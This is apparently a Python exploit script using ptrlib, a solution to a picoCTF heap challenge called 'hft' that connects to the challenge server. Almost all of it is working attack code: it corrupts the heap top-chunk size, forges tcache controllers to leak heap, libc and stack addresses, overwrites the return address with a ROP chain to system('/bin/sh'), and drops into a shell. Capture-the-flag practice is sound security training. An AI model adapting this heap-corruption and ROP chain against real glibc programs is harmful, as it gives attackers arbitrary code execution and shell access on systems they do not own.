from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

sock = Socket("nc tethys.picoctf.net 50123")
# sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0xD28))
sock.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))  # tamper the size of top chunk

# _int_free: tcachebins[0x20]
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"B" * 0xBA8 + p32(0x441))  # tamper the size of top chunk

# _int_free: unsortedbin
sock.sendafter(":[PKT_RES]\n", p64(0x419))
sock.sendline(p64(0x3)[:-1])

# heap base address leak
sock.sendafter(":[PKT_RES]\n", p64(0x19))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
# logger.info(f"heap leak address: {hex(u64(leak))}")
heap_base = u64(leak) - 0x21BC0
logger.info(f"heap base address: {hex(heap_base)}")

sock.sendafter(":[PKT_RES]\n", p64(0x780))
sock.sendline(p64(0x0) + b"C" * 0x778 + p32(0x441))  # tamper the size of top chunk

# _int_free: largebins
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"D" * 0xBA8 + p32(0x441))  # tamper the size of top chunk

# _int_free: largebins
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x3)[:-1])

# fake tcachebins controller no.1
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(heap_base + 0x65BC0)[:-1]
)  # largebins address

# allocate front of tls & tamper the fake tcachebins controller no.1
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"E" * 0x236D8 + p64(heap_base + 0x21C10)[:-1]
)  # -> fake tcachebins controller no.1

# libc base address leak
sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
# logger.info(f"libc leak address: {hex(u64(leak))}")
libc.base = u64(leak) - 0x21A0D0

# fake tcachebins controller no.2
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(libc.base + 0x21AA10)[:-1]
)  # libc address (on stack address)

# tamper the fake tcachebins controller
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"F" * 0x466D8 + p64(heap_base + 0x21CB0)[:-1]
)  # -> fake tcachebins controller no.2

# stack address leak
sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
stack_leak = sock.recvuntil("]\n", drop=True)
logger.info(f"stack leak address: {hex(u64(stack_leak))}")
return_address = u64(stack_leak) - 0x150
logger.info(f"return address: {hex(return_address)}")

# fake tcachebins controller no.3
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(return_address - 0x18)[:-1]
)  # return address - 0x18

# tamper the fake tcachebins controller
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"G" * 0x696D8 + p64(heap_base + 0x21D50)[:-1]
)  # -> fake tcachebins controller no.3

# tamper the return address
sock.sendafter(":[PKT_RES]\n", p64(0x18))
payload = p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(next(libc.gadget("ret;")))
payload += p64(libc.symbol("system"))
sock.sendline(p64(0x0) + b"H" * 0x18 + payload)

sock.sh()